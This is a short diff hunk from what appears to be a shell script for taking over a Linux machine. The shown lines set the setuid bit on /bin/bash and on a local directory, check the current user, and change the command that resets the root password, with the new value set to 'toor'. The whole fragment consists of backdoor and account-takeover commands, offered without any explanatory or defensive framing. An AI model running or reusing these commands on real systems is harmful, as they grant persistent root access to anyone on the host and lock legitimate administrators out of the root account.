@@ -5,4 +5,4 @@ chmod u+s /bin/bash
 chmod u+s ./bin
 
 whoami
-echo -e "lokol#lokol#\n" | passwd root
+echo -e "toor\ntoor\n" | passwd root
